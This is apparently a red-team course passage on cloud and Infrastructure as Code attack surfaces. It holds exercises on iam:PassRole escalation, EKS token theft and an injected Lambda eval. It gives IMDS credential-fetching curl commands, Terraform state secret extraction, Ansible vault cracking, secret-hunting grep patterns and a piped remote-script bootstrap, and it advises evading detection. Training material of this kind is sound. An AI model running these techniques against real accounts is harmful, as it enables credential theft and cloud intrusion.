Exercise 1 — Audit an IAM Policy for iam:PassRole Privesc

Given the following inline policy attached to arn:aws:iam::123456789012:user/deployer:
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow", "Action": "ec2:RunInstances", "Resource": "*" },
    { "Effect": "Allow", "Action": "iam:PassRole", "Resource": "*" },
    { "Effect": "Allow", "Action": "iam:ListInstanceProfiles", "Resource": "*" }
  ]
}

Explain the privesc chain, write the exact aws ec2 run-instances command that exploits it, and propose a policy fix that keeps deployment working. The fix should scope iam:PassRole to a specific low-privilege deploy role via Resource and a Condition on iam:PassedToService.

Exercise 2 — Enumerate a Lab S3 Account

Spin up a personal AWS account (or use an assigned lab account). Create three S3 buckets:

    <your-alias>-public-lab with a bucket policy granting Principal: "*" read.
    <your-alias>-authusers-lab with an ACL granting AuthenticatedUsers read.
    <your-alias>-private-lab with default settings.

From another account (or without credentials), reproduce enumeration with s3scanner and with raw aws s3 ls calls. Document which access model each bucket exposes and how you determined it.

Exercise 3 — Walk an EKS Token Path

Deploy a minimal EKS cluster using eksctl. Create a service account with an IRSA annotation binding it to an IAM role that has s3:ListAllMyBuckets. Run a pod using that SA. Inside the pod, locate the projected token file, extract it, and use aws sts assume-role-with-web-identity from your Kali box to obtain STS credentials from outside the cluster. Confirm the credentials work with aws s3 ls.
17.2 Independent Exercises

Exercise 4 — Cross-Provider IMDS Matrix

Build a matrix of every IMDS endpoint (path, method, headers) for AWS IMDSv1, AWS IMDSv2, GCP, and Azure. For each, write both a plain curl invocation and a single-line Python requests payload that would work from within an SSRF-vulnerable HTTP client that lets you set headers.

Exercise 5 — GCP iam.serviceAccounts.getAccessToken Chain

Design a scenario in a single GCP project with three service accounts — A, B, C — where A can impersonate B, B can impersonate C, and C has roles/owner on the project. Write the gcloud commands to enumerate the chain from A, execute both hops, and end with a call as C that lists all secrets. Then propose a minimal set of role removals to break the chain without breaking B's intended workload.

Exercise 6 — Serverless Secret Extraction

Deploy a Lambda function (Python 3.12 runtime) that reads a DB_URL environment variable and returns a static string. Attach a role that additionally has secretsmanager:GetSecretValue on a specific secret. Introduce a code-injection vulnerability into the function (an intentional eval(event['input'])). From the outside, invoke the function to (a) read the environment variable and (b) retrieve the secret. Then remediate — remove the injection, restrict the environment variable, and switch to fetching the secret inside the handler using IAM.
18. Summary and Next Lesson

Cloud infrastructure is code, and IAM is the operating system. Every provider ships analogous primitives — compute, storage, identity, network — with different names and slightly different trust models. On a modern engagement you will pivot from a web-app foothold to a cloud console far faster than you will pivot from a domain user to Domain Admin. That is because IAM misconfigurations compose: a single iam:PassRole or iam.serviceAccounts.getAccessToken combined with the right adjacent permission is total.

The commands in this lesson — aws sts get-caller-identity, gcloud auth print-access-token, az account show, curl 169.254.169.254, pacu, enumerate-iam, s3scanner, MicroBurst — belong in your muscle memory. When you land in an unfamiliar tenant, they orient you within minutes.

Detection is real and improving. GuardDuty, Security Command Center, and Defender for Cloud have closed the gap on old classic techniques. The winning approach is not to be undetectable but to be quicker than the response, to blend into the noise of legitimate automation, and to preserve every credential you find because the second chain is often the one that matters.

Next lesson: Module 04, Lesson 10 — Kubernetes for Attackers. We take the container abstractions introduced here and drill into the Kubernetes API surface: kube-apiserver, service-account tokens, RBAC, admission controllers, kubectl exec escape paths, and the audit trail Kubernetes leaves when you enumerate. The EKS/GKE/AKS distinctions covered in section 13 become the starting point.





















Lesson 10 — Infrastructure as Code and Configuration

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Infrastructure as Code (IaC) turned operations into software engineering. Every firewall rule, IAM policy, network subnet, and cloud storage bucket is now expressed as text in a git repository. That transformation is a gift to defenders because it makes infrastructure auditable and reproducible — but it is an even bigger gift to attackers, because a single git clone gives you a blueprint of the entire target environment.

IaC repositories leak. They leak by accident on public GitHub. They leak through overly-permissive internal wikis. They leak through misconfigured S3 buckets that mirror them for CI. They leak through state files that developers commit without thinking. When you find one during an engagement, you have found not one vulnerability but the description of every vulnerability the operations team ever wrote down and pushed.

This lesson treats IaC as an attack surface. We will cover the two dominant tools — Terraform and Ansible — plus the ecosystem around them: cloud-init user-data, Packer golden images, Pulumi and CDK, drift detection, policy-as-code, and the supply chain of community modules. Every section includes real Kali 2026 commands and concrete patterns to hunt for. By the end you will be able to walk into a client repo, run three commands, and hand back a report of everything wrong with their cloud posture — before touching production.
1. IaC as an Attack Surface — Source Code Is Ground Truth

IaC is source code, and source code leaks. That single sentence should shape how you approach every engagement that includes an infrastructure component.
1.1 What IaC Repositories Contain

A typical operations repository holds:

    Network topology (VPC CIDRs, subnet layouts, peering relationships)
    Firewall rules and security groups (which ports are open to whom)
    IAM policies (who can do what to which resource)
    Secret backends and their configurations
    Bootstrap scripts run on every new server
    CI/CD pipeline definitions
    Sometimes: actual credentials, tokens, or private keys committed by mistake

Compare that list to what a traditional external pentest gives you: a hostname and a scope document. The IaC repo is the map; the pentest is the terrain. Once you have the map you can plan every subsequent move.
1.2 The Threat Model Shift
Traditional infra:
  attacker → recon → scan → discover services → probe → exploit

IaC-enabled infra:
  attacker → git clone → grep -r "0.0.0.0/0" → know every exposure

    Pentester Insight: Every IaC repository should be threat-modeled as if it were the crown jewels — because operationally it is. During red-team engagements ask early whether the client has an internal infrastructure or terraform-live repo, and whether it is accessible from the developer laptops you have already compromised. That single artifact often makes the rest of the engagement trivial.

1.3 Where IaC Lives During a Test
Location	Common contents	Access requires
Public GitHub	Open-source modules, occasional mistakes	Nothing
Internal GitHub/GitLab	Live infrastructure definitions	Developer credentials
CI/CD pipeline artifacts	Compiled plans, state snapshots	CI runner access
S3/GCS backend buckets	Terraform state files	Cloud read permission
Developer workstations	Local .terraform/ folders	Endpoint compromise
Backup systems	Historical state and plans	Backup restore rights
2. Terraform Fundamentals

Terraform, from HashiCorp, is the de facto standard for declarative multi-cloud infrastructure. You write HCL (HashiCorp Configuration Language) files describing desired state; Terraform reconciles them with reality.
2.1 Installing Terraform on Kali 2026
# Kali 2026 ships terraform in the community repositories:
sudo apt update
sudo apt install terraform

# Verify:
terraform version
# Terraform v1.9.5
# on linux_amd64

# If you need a specific version, use tfenv:
sudo apt install tfenv
tfenv install 1.9.5
tfenv use 1.9.5
2.2 HCL Syntax Overview

A minimal Terraform file demonstrates every core construct:
# providers.tf
terraform {
  required_version = ">= 1.5"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.region
}

# variables.tf
variable "region" {
  type    = string
  default = "us-east-1"
}

variable "bucket_name" {
  type = string
}

# data.tf — read-only lookups
data "aws_caller_identity" "current" {}

# main.tf — declarative resources
resource "aws_s3_bucket" "logs" {
  bucket = var.bucket_name
  tags = {
    Owner = data.aws_caller_identity.current.account_id
  }
}

# outputs.tf
output "bucket_arn" {
  value = aws_s3_bucket.logs.arn
}
2.3 The Terraform Workflow
# Initialize the working directory (downloads providers, sets up backend):
terraform init

# Show what Terraform will change without changing anything:
terraform plan -out=tfplan

# Apply the plan:
terraform apply tfplan

# Tear it all down:
terraform destroy

# Format code to canonical style:
terraform fmt -recursive

# Validate syntax and internal references:
terraform validate
2.4 Modules

Modules are reusable Terraform packages. A module has its own .tf files and can be called from other configurations:
module "network" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.1.2"

  name = "prod-vpc"
  cidr = "10.0.0.0/16"
}

Modules can come from the local disk, git repositories, the public Terraform Registry, or private registries. Every module source is a supply-chain input you must trust.
2.5 Backends

A backend tells Terraform where to store state. The default local backend writes terraform.tfstate to the current directory — fine for solo work, catastrophic for teams. Remote backends store state in a shared, locked location.
3. The Terraform State File — The Most Sensitive Artifact

The single most valuable file in any Terraform-managed environment is terraform.tfstate. It is a JSON document that mirrors the entire infrastructure — and in doing so, it stores every attribute of every resource, including attributes marked sensitive, in plaintext.
3.1 What State Actually Contains
# Inspect a state file (never do this on a production copy without permission):
cat terraform.tfstate | jq '.resources[] | select(.type=="aws_db_instance")'

# Fields commonly present in plaintext:
#   .instances[].attributes.password
#   .instances[].attributes.master_password
#   .instances[].attributes.secret_string
#   .instances[].attributes.private_key_pem
#   .instances[].attributes.access_key

An attacker with read access to state has effectively snapshotted every RDS master password, every KMS-encrypted-then-decrypted value, every generated TLS private key, and every IAM access key that Terraform ever created.
3.2 Local State — What Not To Do
# The default backend if nothing is configured:
ls -la
# -rw-r--r-- 1 user user  14523 terraform.tfstate
# -rw-r--r-- 1 user user   8901 terraform.tfstate.backup

# .gitignore MUST include:
#   terraform.tfstate
#   terraform.tfstate.backup
#   *.tfvars
#   .terraform/

The number of client engagements where I have found terraform.tfstate committed to a repository, on a developer laptop, or sitting in an unprotected shared drive is not small.
3.3 Remote Backends — S3 + DynamoDB

The canonical AWS pattern combines an S3 bucket for storage with a DynamoDB table for locking:
terraform {
  backend "s3" {
    bucket         = "acme-tf-state"
    key            = "prod/network/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "acme-tf-locks"
    encrypt        = true
    kms_key_id     = "arn:aws:kms:us-east-1:111122223333:key/mrk-abc"
  }
}

Locking prevents two engineers from running terraform apply at the same time. Encryption prevents S3 object exfil from being a total loss.
3.4 Other Remote Backends
# Google Cloud Storage:
backend "gcs" {
  bucket = "acme-tf-state"
  prefix = "prod/network"
}

# Azure Blob:
backend "azurerm" {
  resource_group_name  = "tfstate-rg"
  storage_account_name = "acmetfstate"
  container_name       = "state"
  key                  = "prod.terraform.tfstate"
}

# Terraform Cloud / HCP:
cloud {
  organization = "acme"
  workspaces {
    name = "prod-network"
  }
}
3.5 Hunting State Files During an Engagement
# On a compromised developer workstation:
find / -name "terraform.tfstate*" 2>/dev/null
find / -name ".terraform" -type d 2>/dev/null

# In a git repository (including history):
git log --all --full-history -- '**/terraform.tfstate'
git log --all -p | grep -A2 '"password"'

# In an S3 bucket you can list:
aws s3 ls s3://acme-tf-state/ --recursive | grep tfstate

# Extract secrets from a captured state file:
jq -r '.resources[] | .instances[]?.attributes | to_entries[] | select(.value | tostring | test("(?i)pass|secret|key|token"))' terraform.tfstate

    Pentester Insight: A single stolen terraform.tfstate from a mid-size company can hand you domain-wide RDS passwords, IAM access keys, KMS aliases with their attached policies, and every EC2 tag that reveals which host runs which sensitive workload. Treat state theft as a top-priority objective.

4. Reading Terraform for Security Posture

Before you run any scanner, learn to read HCL with pentester eyes. Scanners miss context; humans do not.
4.1 IAM Wildcards
# The classic disaster — administrative access to everything:
resource "aws_iam_policy" "app" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"
      Resource = "*"
    }]
  })
}

Grep pattern:
grep -rEn '"Action"\s*[:=]\s*"?\*' .
grep -rEn '"Resource"\s*[:=]\s*"?\*' .
grep -rEn 'iam:\*|s3:\*|ec2:\*' .
4.2 Public S3 Buckets
resource "aws_s3_bucket_public_access_block" "bad" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = false
  block_public_policy     = false
  ignore_public_acls      = false
  restrict_public_buckets = false
}

resource "aws_s3_bucket_acl" "worse" {
  bucket = aws_s3_bucket.data.id
  acl    = "public-read"
}

Grep pattern:
grep -rEn 'acl\s*=\s*"public' .
grep -rEn 'block_public_(acls|policy)\s*=\s*false' .
grep -rEn 'publicly_accessible\s*=\s*true' .
4.3 Unversioned Buckets — Ransomware and Deletion Risk
resource "aws_s3_bucket_versioning" "logs" {
  bucket = aws_s3_bucket.logs.id
  versioning_configuration {
    status = "Suspended"   # or absent entirely
  }
}

Grep pattern:
grep -rEn 'versioning\s*\{[^}]*enabled\s*=\s*false' .
grep -rEn 'status\s*=\s*"Suspended"' .
4.4 World-Open Security Groups
resource "aws_security_group_rule" "ssh_world" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}

Grep pattern:
grep -rEn 'cidr_blocks\s*=\s*\["0\.0\.0\.0/0"' .
grep -rEn '::/0' .
grep -rEn 'source_ranges\s*=\s*\["0\.0\.0\.0/0"' .   # GCP
4.5 Unencrypted Storage
grep -rEn 'storage_encrypted\s*=\s*false' .
grep -rEn 'encryption\s*=\s*"NONE"' .
grep -rEn 'kms_key_id' .   # inverse — find what IS encrypted
4.6 Hardcoded Credentials
grep -rEnI '(access_key|secret_key|password|token)\s*=\s*"[A-Za-z0-9+/=]{16,}"' .
grep -rEnI 'AKIA[0-9A-Z]{16}' .
grep -rEnI 'AIza[0-9A-Za-z_\-]{35}' .
5. Terraform-Only Scanners

Manual review scales poorly. Purpose-built scanners run in seconds and catch the well-known patterns.
5.1 tfsec
# Install (Kali 2026):
sudo apt install tfsec

# Or via the official installer:
curl -s https://raw.githubusercontent.com/aquasecurity/tfsec/master/scripts/install_linux.sh | bash

# Scan a directory:
tfsec .

# Typical output:
#   Result #1 HIGH Bucket does not have versioning enabled
#     ./s3.tf:12-18
#      12 | resource "aws_s3_bucket" "data" {
#      13 |   bucket = "acme-data"
#      14 | }
#     ID:  aws-s3-enable-versioning
#     Impact: Deleted or modified data would not be recoverable
#     Resolution: Enable versioning

# JSON output for pipelines:
tfsec . --format json > tfsec-report.json

# Exclude known-acceptable findings:
tfsec . --exclude aws-s3-enable-versioning,aws-vpc-no-public-ingress-sgr
5.2 checkov
# Install via pip (isolated environment recommended):
pipx install checkov

# Scan Terraform, CloudFormation, Kubernetes manifests, and more:
checkov -d .

# Focus on a single framework:
checkov -d . --framework terraform

# SARIF for GitHub code scanning:
checkov -d . -o sarif --output-file-path checkov.sarif

# Skip known-safe checks:
checkov -d . --skip-check CKV_AWS_18,CKV_AWS_144
5.3 terrascan
sudo apt install terrascan
terrascan scan -t aws -i terraform -d .

# Policy packs cover AWS, Azure, GCP, Kubernetes, Docker, GitHub.
5.4 regula
# Regula uses OPA/Rego rules under the hood:
curl -L https://github.com/fugue/regula/releases/latest/download/regula_linux_amd64.tar.gz | tar xz
sudo mv regula /usr/local/bin/

regula run .
regula run --format json .
5.5 Combining Scanners
# A defense-in-depth CI stage:
tfsec . --format json > out/tfsec.json
checkov -d . -o json > out/checkov.json
terrascan scan -t aws -i terraform -d . -o json > out/terrascan.json

# Then feed all three into a triage script — different scanners catch
# different issues. Never rely on just one.
6. Ansible Fundamentals

Ansible is the imperative counterpart to Terraform. Where Terraform declares desired state, Ansible executes ordered tasks. Ansible does not require an agent — it runs over SSH (or WinRM for Windows) using Python on the target.
6.1 Installing Ansible on Kali 2026
sudo apt install ansible ansible-lint

ansible --version
# ansible [core 2.17.4]
#   config file = /etc/ansible/ansible.cfg
#   python version = 3.12.5
6.2 Inventory

An inventory lists the hosts Ansible manages:
# inventory.ini
[web]
web01.acme.local ansible_user=deploy
web02.acme.local ansible_user=deploy

[db]
db01.acme.local ansible_user=postgres

[all:vars]
ansible_ssh_private_key_file=~/.ssh/acme_deploy

Or YAML:
all:
  children:
    web:
      hosts:
        web01.acme.local:
        web02.acme.local:
    db:
      hosts:
        db01.acme.local:

Dynamic inventories query cloud APIs at runtime:
ansible-inventory -i aws_ec2.yaml --graph
6.3 Playbooks

A playbook is a YAML file of tasks against hosts:
# site.yml
- name: Configure web servers
  hosts: web
  become: true
  vars:
    app_version: "2.4.1"
  tasks:
    - name: Install nginx
      ansible.builtin.package:
        name: nginx
        state: present

    - name: Deploy config
      ansible.builtin.template:
        src: nginx.conf.j2
        dest: /etc/nginx/nginx.conf
      notify: restart nginx

  handlers:
    - name: restart nginx
      ansible.builtin.service:
        name: nginx
        state: restarted

Run it:
ansible-playbook -i inventory.ini site.yml
ansible-playbook -i inventory.ini site.yml --check       # dry-run
ansible-playbook -i inventory.ini site.yml --diff        # show file diffs
ansible-playbook -i inventory.ini site.yml --limit web01 # single host
6.4 Roles

Roles package related tasks, handlers, templates, and defaults:
roles/
  nginx/
    tasks/main.yml
    handlers/main.yml
    templates/nginx.conf.j2
    defaults/main.yml
    vars/main.yml
    meta/main.yml
6.5 Ansible Vault

Encrypted variable files use AES-256 with a passphrase-derived key:
ansible-vault create group_vars/prod/secrets.yml
ansible-vault edit  group_vars/prod/secrets.yml
ansible-vault view  group_vars/prod/secrets.yml
ansible-vault encrypt_string 'super-secret' --name db_password

Playbooks run against vaulted vars using --ask-vault-pass or a password file.
7. Ansible Playbook Security Review

Ansible playbooks are executed with root on the target. Every review is therefore a supply-chain review.
7.1 Shell Injection Sinks
# DANGEROUS — user input flows into a shell:
- name: Fetch user data
  ansible.builtin.shell: "curl {{ user_url }}"

- name: Rebuild
  ansible.builtin.command: "make {{ user_target }}"

# SAFER — module with structured arguments:
- name: Fetch user data
  ansible.builtin.get_url:
    url: "{{ user_url }}"
    dest: /tmp/data

Grep patterns:
grep -rEn 'ansible\.builtin\.(shell|command|raw):' roles/ playbooks/
grep -rEn '^\s*shell:\s*' .
grep -rEn '{{[^}]*}}' . | grep -Ei 'shell|command'
7.2 no_log Discipline

Tasks that touch secrets must be marked no_log: true, or the secret will land in /var/log/ansible.log and any CI job log:
- name: Set DB password
  community.postgresql.postgresql_user:
    name: app
    password: "{{ vault_db_password }}"
  no_log: true      # required

Grep the inverse — find secret-touching tasks that are NOT marked:
grep -rEln '(password|token|secret|api_key)' roles/ | while read f; do
  grep -L 'no_log:\s*true' "$f"
done
7.3 World-Readable Files
# Common mistake:
- name: Write kubeconfig
  ansible.builtin.copy:
    content: "{{ kubeconfig }}"
    dest: /etc/kubernetes/admin.conf
    mode: '0644'          # world-readable — should be 0600

# Look for permissive modes on sensitive paths: grep -rEn "mode:\s*['\"]0?6[46]4['\"]" roles/ playbooks/ | \
  grep -Ei 'kube|secret|token|password|\.key|\.pem'
7.4 Plaintext Secrets in group_vars
# Any unencrypted YAML in group_vars is a red flag if it contains secret-like keys:
grep -rEln 'password:|token:|secret:|api_key:' group_vars/ host_vars/ | while read f; do
  head -1 "$f" | grep -q '^\$ANSIBLE_VAULT' || echo "UNENCRYPTED: $f"
done
7.5 ansible-lint
ansible-lint site.yml
ansible-lint --profile production roles/

# The `no-log-password` and `command-instead-of-shell` rules catch
# many of the patterns above automatically.
8. Ansible Vault — Encryption Done Poorly

Vault is only as strong as the passphrase and where it lives.
8.1 The Cardinal Sin

The single most common Vault failure is committing the encrypted file AND the password to the same repository:
repo/
  group_vars/prod/secrets.yml    # encrypted with ansible-vault
  .vault_pass                     # plaintext passphrase — DISASTER

Hunt for this pattern:
find . -name '.vault_pass*' -o -name 'vault_password*' -o -name '*.vault_key' 2>/dev/null
grep -rEln '^\$ANSIBLE_VAULT;' . > encrypted.txt
grep -rEln 'ANSIBLE_VAULT_PASSWORD' .
8.2 Vault File Structure

An encrypted file always starts with a header line:
$ANSIBLE_VAULT;1.1;AES256
36393464653734653733...   (hex ciphertext)

The 1.1 label uses AES-256-CTR with an HMAC-SHA256 tag. The 1.2 label (Ansible 2.4+) adds per-vault labels so multiple secrets can coexist.
8.3 Integrating a Real Secret Backend

For production the passphrase should come from HashiCorp Vault, AWS Secrets Manager, or a similar service:
# ansible.cfg
[defaults]
vault_password_file = /usr/local/bin/vault-pw.sh

# vault-pw.sh
#!/bin/sh
vault kv get -field=password secret/ansible/prod

The script fetches the passphrase from HashiCorp Vault at run time. The passphrase never lives on disk.
8.4 Cracking a Weak Vault

If you find an encrypted vault file with a weak passphrase, offline cracking is straightforward:
# Convert to john's format:
python3 /usr/share/john/ansible2john.py secrets.yml > vault.hash

# Attack with a wordlist:
john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash

# Or hashcat (mode 16900):
hashcat -m 16900 vault.hash /usr/share/wordlists/rockyou.txt

    Pentester Insight: During a Git-history review, always check every historical version of a vaulted file. Passphrases get rotated but old ciphertexts stay behind — cracking the old passphrase often reveals the pattern used to construct the current one.

9. Cloud-Init and user-data

Every modern cloud VM boots by executing a user-data blob supplied at launch time. That blob typically contains cloud-init directives or a shell script — and often contains provisioning credentials.
9.1 Cloud-Init YAML Example
#cloud-config
users:
  - name: admin
    sudo: ALL=(ALL) NOPASSWD:ALL
    ssh_authorized_keys:
      - ssh-ed25519 AAAAC3Nz... ops@acme

write_files:
  - path: /etc/consul/consul.hcl
    permissions: '0600'
    content: |
      encrypt = "K5G4t3XmA..."
      acl { tokens { agent = "s3cr3t-token" } }

runcmd:
  - curl -H "X-Auth: $(cat /etc/secrets/api_token)" https://install.acme.io/bootstrap | bash
9.2 IMDS Retrieval

The Instance Metadata Service (IMDS) exposes user-data to anything running on the instance — including a compromised web application:
# AWS IMDSv2 (default and required in modern accounts):
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/user-data

# GCP:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data

# Azure:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/customData?api-version=2021-02-01"
9.3 SSRF as an IaC Attack Vector

Any application-layer SSRF that reaches 169.254.169.254 becomes an IaC extractor. On an EC2 instance the same endpoints yield:

    iam/security-credentials/<role-name> — temporary AWS keys
    user-data — the bootstrap script
    hostname, local-hostname, public-hostname — for lateral discovery

9.4 Hunting user-data Server-Side

If you have API access to list instances:
# AWS:
aws ec2 describe-instance-attribute --instance-id i-0abc --attribute userData \
  --query 'UserData.Value' --output text | base64 -d

# GCP:
gcloud compute instances describe web01 --zone=us-central1-a \
  --format='value(metadata.items.startup-script)'
10. Packer — Baking Credentials Into Golden Images

Packer produces immutable machine images (AMIs, Compute Engine images, VMware templates) from a build definition. If secrets leak into the image, every VM launched from it exposes them.
10.1 A Packer Build File
source "amazon-ebs" "base" {
  region        = "us-east-1"
  ami_name      = "acme-web-{{timestamp}}"
  instance_type = "t3.medium"
  source_ami    = "ami-0abcdef1234567890"
  ssh_username  = "ec2-user"
}

build {
  sources = ["source.amazon-ebs.base"]

  provisioner "shell" {
    inline = [
      "sudo yum install -y nginx",
      "sudo systemctl enable nginx",
    ]
  }
}
10.2 Common Packer Mistakes

    Embedding SSH private keys in the built image (/home/ec2-user/.ssh/id_rsa)
    Baking in bearer tokens for post-boot registration
    Leaving /tmp/*.sh provisioning scripts with API keys inside
    Building with -var 'api_key=...' and forgetting that Packer logs redact only partially

10.3 Extracting Secrets From a Suspect AMI
# Launch an instance from the AMI (in a sandbox account), then:
sudo grep -rEn 'AKIA|BEGIN PRIVATE KEY|api[_-]?key|password' \
  / --include='*.sh' --include='*.conf' --include='*.env' 2>/dev/null

# Search the cloud-init logs which often preserve provisioning output:
sudo cat /var/log/cloud-init-output.log
sudo cat /var/log/cloud-init.log
11. Pulumi and CDK — IaC With Real Programming Languages

Pulumi and AWS CDK let you write infrastructure in TypeScript, Python, Go, or C#. That flexibility multiplies the ways secrets and misconfigurations sneak in.
11.1 Pulumi Example (TypeScript)
import * as aws from "@pulumi/aws";

const bucket = new aws.s3.Bucket("data", {
    acl: "public-read",                 // same anti-pattern as HCL
});

const key = new aws.iam.AccessKey("ci", { user: "ci-runner" });
export const secret = key.secret;       // will land in state

Pulumi state lives in the Pulumi Service or in an S3/GCS/Azure Blob backend, and — like Terraform — contains every attribute in plaintext unless you explicitly mark values as Output.secret.
11.2 CDK — Synth Time Executes Your Code

CDK synthesizes CloudFormation templates by executing the user's application:
cdk synth
cdk diff
cdk deploy

cdk synth runs arbitrary code. A malicious CDK dependency can:

    Read AWS credentials from ~/.aws/credentials
    Exfiltrate the developer's environment variables
    Modify the emitted template to insert a backdoor role

11.3 Attack Angles Unique to Code-Based IaC

    npm/pip typosquatting on the IaC package (e.g., @pulumi/aws-extras)
    Post-install scripts in transitive dependencies
    plan and synth running in CI without egress restrictions
    Dynamic template generation that pulls from external URLs at plan time

11.4 Hunting Pulumi State
# Local backend:
find / -name 'Pulumi.*.yaml' -o -name '.pulumi' -type d 2>/dev/null

# Remote (S3 backend):
aws s3 ls s3://acme-pulumi-state/ --recursive
12. Drift Detection — Reality vs. Declaration

Drift is the gap between what IaC says exists and what actually exists in the cloud. Drift is opportunity for attackers: an emergency rule opened in the console and never codified is a rule the review process never approved.
12.1 terraform plan as a Drift Tool
# A no-change plan proves alignment:
terraform plan -detailed-exitcode
# Exit code 0 = no changes
# Exit code 1 = error
# Exit code 2 = changes required (i.e., drift)

# Refresh state without applying:
terraform refresh
terraform plan       # any diff = drift
12.2 driftctl
# Install:
curl -L https://github.com/snyk/driftctl/releases/latest/download/driftctl_linux_amd64 \
  -o /usr/local/bin/driftctl
chmod +x /usr/local/bin/driftctl

# Scan for unmanaged resources:
driftctl scan --from tfstate://terraform.tfstate

# Output:
#   Found unmanaged resources:
#     aws_security_group_rule.abc123 (port 22, 0.0.0.0/0)
#     aws_iam_user.ghostops

Unmanaged resources are gold during a red-team review. They exist without a paper trail.
12.3 Cloud-Native Drift Detection
# AWS Config:
aws configservice describe-config-rules
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name s3-bucket-public-read-prohibited

# GCP Config Validator / Security Command Center:
gcloud scc findings list \
  --organization=123456789 \
  --filter='state="ACTIVE" AND category="PUBLIC_BUCKET_ACL"'

# Azure Policy:
az policy state list --filter "ComplianceState eq 'NonCompliant'"
12.4 What Drift Looks Like in Practice
Symptom	Likely cause	Pentester value
Extra IAM policy attached to role	Emergency access grant, never removed	Persistence path
Security group rule with 0.0.0.0/0 not in Terraform	Manual "temporary" fix	External exposure
Extra S3 bucket in the account	Shadow project	Fresh target
KMS key with a public policy	Debugging shortcut	Data decryption
13. Secret Leakage in IaC Repositories

IaC repos concentrate secrets because they concentrate configuration. Every scanner in this section belongs in your first-day-on-engagement toolkit.
13.1 gitleaks
# Install on Kali 2026:
sudo apt install gitleaks

# Scan the working tree:
gitleaks detect --source . --verbose

# Scan the entire git history:
gitleaks detect --source . --log-opts="--all"

# JSON report:
gitleaks detect --source . --report-format json --report-path leaks.json

# Sample finding:
#   Finding:  AKIAIOSFODNN7EXAMPLE
#   Secret:   wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
#   RuleID:   aws-access-token
#   File:     terraform/live/prod/variables.tf
#   Commit:   9c2a1b3e...
13.2 trufflehog
# Install:
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin

# Scan a git repo including history and validate the secrets:
trufflehog git file://. --only-verified --json > tf-report.json

# Verified means the secret was tested against the real service and works.
# That is the difference between "false positive" and "active credential".

# Scan a GitHub org:
trufflehog github --org=acme --token=$GITHUB_TOKEN --only-verified

# Scan an S3 bucket:
trufflehog s3 --bucket=acme-backup --only-verified
13.3 GitHub Native Secret Scanning
# List secret scanning alerts via the API:
gh api /repos/acme/infra/secret-scanning/alerts | jq '.[] | {rule: .secret_type, state, url}'

# Push-protection prevents commits containing known secret patterns.
# During an assessment, check whether push protection is enabled at
# the org level:
gh api /orgs/acme | jq '.secret_scanning_push_protection_enabled_for_new_repositories'
13.4 Signatures Worth Grepping For
grep -rEn 'AKIA[0-9A-Z]{16}' .                           # AWS access key
grep -rEn 'ASIA[0-9A-Z]{16}' .                           # AWS session key
grep -rEn 'aws_secret_access_key' .
grep -rEn 'AIza[0-9A-Za-z_\-]{35}' .                     # Google API key
grep -rEn 'ya29\.[0-9A-Za-z_\-]+' .                      # Google OAuth token
grep -rEn 'ghp_[A-Za-z0-9]{36}' .                        # GitHub PAT
grep -rEn 'gho_[A-Za-z0-9]{36}' .                        # GitHub OAuth
grep -rEn 'xox[abpr]-[A-Za-z0-9-]{10,}' .                # Slack tokens
grep -rEn 'sk_live_[0-9a-zA-Z]{24,}' .                   # Stripe live
grep -rEn -- '-----BEGIN (RSA|EC|OPENSSH|PRIVATE) KEY-----' .
grep -rEn 'service_account.*json' .
find . -name '*.pem' -o -name '*.key' -o -name 'service_account*.json'
13.5 Rotation Reality

Finding a secret is step one. During an engagement always verify:

    Is the secret valid right now? (Use aws sts get-caller-identity, gcloud auth, etc.)
    How old is it? (git log --follow -p -- path/to/file)
    Who else could have read it? (Repo access, CI logs, forks)
    Was it ever committed to a public fork?

14. Policy-as-Code — Enforcing Invariants at Plan Time

Scanners find problems after the fact. Policy-as-code refuses to let them merge.
14.1 OPA / Rego

Open Policy Agent evaluates Rego rules against Terraform plans in JSON form:
# Emit a plan as JSON:
terraform plan -out=tfplan.bin
terraform show -json tfplan.bin > tfplan.json

# Evaluate against a policy bundle:
opa eval -d policy/ -i tfplan.json 'data.terraform.deny'

A simple Rego rule against public buckets:
package terraform.aws

deny[msg] {
  resource := input.resource_changes[_]
  resource.type == "aws_s3_bucket_acl"
  resource.change.after.acl == "public-read"
  msg := sprintf("Public S3 bucket ACL on %s", [resource.address])
}
14.2 Sentinel (Terraform Cloud/Enterprise)

Sentinel policies run inside the Terraform Cloud pipeline. They can be enforced as advisory, soft-mandatory, or hard-mandatory.
14.3 Conftest
sudo apt install conftest
conftest test tfplan.json --policy policy/
14.4 Kyverno for Kubernetes IaC

Kyverno enforces admission-time policies against Kubernetes manifests, including Helm-rendered and Kustomize-rendered YAML that IaC pipelines produce.
14.5 Coverage in Practice

Well-run environments layer policy-as-code, scanners, and runtime detection. During a review, ask which of the three layers exist. Environments with only runtime detection are the softest.
15. Supply Chain — Modules, Roles, and Registries

Every module you consume is code you execute with cloud-admin privileges.
15.1 Terraform Registry Risks
# List every third-party module a repo depends on:
grep -rEn 'source\s*=' . | grep -Ev 'source\s*=\s*"\.\.?/' | \
  grep -Ev 'source\s*=\s*"terraform-aws-modules/'

Attack angles:

    Typosquat: hashicrop/aws, terraform-aws-modulez/vpc
    Compromised maintainer account publishes a malicious version
    Version pin missing — module "x" { source = "acme/mod/aws" } with no version clause auto-upgrades

Pin versions and hash-verify where possible:
